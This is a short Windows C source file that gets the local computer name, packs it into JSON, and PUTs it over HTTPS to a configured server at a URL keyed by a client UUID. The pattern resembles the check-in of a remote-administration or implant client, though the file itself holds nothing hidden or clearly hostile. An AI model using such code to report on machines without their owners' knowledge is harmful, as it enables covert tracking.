#include "pa5a.hpp"

EXTERN_C_START

//Fonction qui crée un objet javascript contenant les informations
cJSON* CreateInformationsJsonObject()
{
	//Retrive computer name
	CHAR computerName[COMPUTER_NAME_SIZE] = { 0 };
	DWORD computerNameSize = sizeof(computerName);

	if (!GetComputerNameA(computerName, &computerNameSize))
		return NULL;

	//Create json object to put client informations
	cJSON* object = NULL;

	if (!(object = cJSON_CreateObject()))
		return NULL;

	if (!cJSON_AddStringToObject(object, "computerName", computerName))
		return NULL;

	return object;
}
/********************************************************************************************************************************************************/
BOOL SendClientInformations()
{
	//Retrive json object with client informations
	cJSON* informationsObject = NULL;

	if (!(informationsObject = CreateInformationsJsonObject()))
		return FALSE;

	LPSTR jsonString = NULL;

	if (!(jsonString = cJSON_Print(informationsObject)))
	{
		cJSON_Delete(informationsObject);
		return FALSE;
	}

	//Construction de l'url
	CHAR url[URL_SIZE] = { 0 };
	CHAR uuid[UUID_SIZE] = { 0 };
	GetUuid(uuid);

	if (StringCbPrintfA(url, sizeof(url), "%s%s", CLIENT_API_A, uuid) != S_OK)
	{
		free(jsonString);
		cJSON_Delete(informationsObject);
		return FALSE;
	}

	if (!SendJsonDataByHttps(SERVER_NAME_A, HTTPS_PORT, url, "PUT", USER_AGENT_A, jsonString))
	{
		free(jsonString);
		cJSON_Delete(informationsObject);
		return FALSE;
	}

	free(jsonString);
	cJSON_Delete(informationsObject);

	return TRUE;
}
/********************************************************************************************************************************************************/
EXTERN_C_END
